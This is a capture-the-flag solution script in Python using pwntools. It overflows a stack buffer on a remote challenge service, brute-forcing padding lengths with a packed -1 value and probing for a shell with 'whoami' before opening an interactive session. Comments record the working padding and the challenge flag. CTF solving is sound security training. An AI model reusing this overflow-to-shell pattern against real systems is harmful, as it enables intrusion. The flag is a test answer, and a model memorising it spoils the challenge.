# https://medium.com/@codingkarma/buffer-overflow-using-pwntools-pwnable-kr-1ac19dcb7240
from pwn import *

### Exploit Variable #######################################
for length in range(32, 50):
    #io = process("./beginner-generic-pwn-number-0")
    io = remote('mc.ax', 31199)
    variable = pack(-1, '64', 'little', 'signed')
    #p64(0xcafebabe) # Auto converts using big endian
    io.send(b"A"*length+variable+b"\n")
    io.recv()
    try:
        io.sendline("whoami\n")
        res = io.recv()
        print(res)
        if res != b'':
            io.interactive()
        #break
    except:
        print(length)
    print("#"*80)

# Padding of 40
# flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
